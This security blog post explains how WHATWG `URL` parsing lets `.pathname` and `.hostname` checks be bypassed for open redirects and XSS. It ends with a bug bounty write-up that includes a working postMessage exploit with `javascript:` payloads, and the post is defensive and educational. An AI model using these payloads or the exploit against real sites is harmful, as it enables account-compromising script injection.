+++
title = "Messing Around with Parsed URLs"
date = 2026-04-15
description = "WHATWG URL parsing has some weird corners. They turn into XSS and open redirects when devs trust the wrong properties of a `URL` object."
+++

## Claims

- `new URL(userControlled).pathname` is **not** safe to feed into `location.href`. For special schemes (`http`, `https`, `ws`, `wss`, `ftp`, `file`) it can start with `//` and turn into an open redirect. For non-special schemes it can start with `javascript:` and turn into XSS.
- The `.hostname` of a `URL` is also not safe to allowlist against, because browsers happily parse `javascript://...stuff...evil.com` into a "URL" whose hostname ends in your trusted domain.
- Both behaviors come straight from the [WHATWG URL Standard](https://url.spec.whatwg.org/). Browsers are doing the spec-conformant thing. The bugs are in the application code.
- The `URL` API looks like a sanitizer and, if done right, it can *be* a sanitizer, but it comes with a few footguns.

## What started this

I saw this [Critical Thinking Podcast short](https://www.youtube.com/shorts/hWVk9jb6L10) that pointed out a `javascript:` URL parsed by `new URL()` can end up with a `hostname` attribute. This is kind of weird. Turns out there seems to be a lot of code on the web where devs rely on attributes of `URL`-parsed objects for validating user-controlled data and there is more than one way this can lead to problems. I will explore two of them here.

## Extra slashes in special URLs

This is a standard pattern and looks fine on first read:

```js
// redirect client to the path of a given URL
const userControlledURL = new URL(userControlled)
location.href = userControlledURL.pathname
```

You would expect the code to just pull out the path, so even if `userControlled` is something like `https://evil.com/foo`, the code will navigate to `/foo` on the current origin. Reasonable.

But:

```js
(new URL("https://nice.com//evil.com")).pathname
// -> "//evil.com"
```

If `userControlled === "https://nice.com//evil.com"`, the snippet above sets `location.href = "//evil.com"`, which the browser resolves as a protocol-relative URL, straight to `https://evil.com`. Open redirect.


The browser treats `/` as a path-segment separator inside [path state](https://url.spec.whatwg.org/#path-state). The relevant rule, paraphrased: "if `c` is `/`, then terminate the current path segment." (the same is true for `\` by the way).

So tracing `https://nice.com//evil.com` through the parser: after `https://nice.com` is consumed, path state runs with `c = /` and an empty buffer. Special URL, `c` is `/` → terminate the (empty) segment. Path is now `[""]`. Then it reads `evil.com` into the buffer, end-of-input flushes it. Final path: `["", "evil.com"]`. The serializer joins with `/` and prefixes one, giving `"//evil.com"`.

For `https:` URIs the path is guaranteed to start with a `/`. That doesn't save you here: `//evil.com` also starts with `/`.

## It gets worse with custom schemes

For non-special schemes, if the scheme isn't followed by `//`, the parser goes straight to path state and the pathname gets no leading `/`:

```js
(new URL("bla:javascript:alert(1)")).pathname
// -> "javascript:alert(1)"
```

So if `userControlled === "bla:javascript:alert(1)"` and the same redirect snippet runs:

```js
location.href = "javascript:alert(1)"
```

XSS!

## Quick write-up of a real-world bug bounty finding

Back to the initial observation that `javascript:` URLs can have non-falsey `.hostname`/`.host` attributes. After learning that, I went back to a target with a web message handler that I had looked at before but didn't manage to exploit. The vulnerable code was a `message` handler that looked roughly like this:

```js
window.addEventListener("message", (event) => {
    let data = event.data;

    if (data?.event_type === "NAVIGATE") {
        try {
            let t = new URL(data.href);
            if (
                t.hostname.endsWith(".target.com")
            ) {
                router.push(data.href);
            }
        } catch {}
    }
});
```

Two things going wrong:

1. No `event.origin` check on the message itself.
2. As pointed out: **`.hostname` of a parsed URL is not what you think it is** when the URL has a non-special scheme.

To get a `.hostname`, the string still has to start with `[SCHEME]://...`. This is possible with a functioning XSS payload. To check this yourself, try this in the DevTools console:

```text
> let url = new URL("javascript://%0aconsole.log('pwned')%2f%2f.example.com/")
> url.hostname
"%0aconsole.log('pwned')%2f%2f.example.com"
> url.host
"%0aconsole.log('pwned')%2f%2f.example.com"
> window.location = url.href
// pwned
```

This is the WHATWG behavior: the spec lets non-special URLs carry an authority. So the exploit:

```js
const win = window.open("https://www.target.com/")
await new Promise(r => setTimeout(r, 600))  // wait for load
win.postMessage({
    "event_type": "NAVIGATE",
    "href": "javascript://%0aalert(document.domain)%2f%2f.target.com/"
}, "*")
```

`new URL(data.href)` parses, `.hostname` is `%0aalert(document.domain)%2f%2f.target.com` (and therefore ends with `.target.com`), suffix check passes. `router.push(data.href)` runs with the same string, the browser navigates to a `javascript:` URL, and:

- `%0a` decodes to a newline, terminating the JS comment that the `//` opened
- `alert(document.domain)` runs on the next line
- `//.target.com/` is a trailing comment

## Wrapping up

Going back to the claims at the top: `URL` *can* be used as a sanitizer, but only if you check the scheme first. Without that check, `.pathname`, `.hostname`, `.host` are just *components of the parse result*, and what those components mean depends entirely on the scheme. Two vectors discussed above are instances of the same mistake: trusting a component without first asking whether the scheme makes that component meaningful:

- `.pathname` looks like a relative path, but for special URLs it can start with `//` (backslash trick), and for non-special URLs it can be `javascript:alert(1)` (opaque path).
- `.hostname` looks like a hostname, but for non-special URLs it's whatever bytes the spec lets you stuff between `//` and the next path-terminating character.

A short list of things that are *probably* safe for redirect/allowlist code:

- Compare `parsed.origin === "https://your.exact.origin"` and reject anything else.
- Explicitly check `parsed.protocol === "https:"` before doing anything with `parsed.hostname`.
- If you want to redirect to a path, prefix it: `window.location = window.location.origin + "/" + parsed.pathname.substr(1)`.
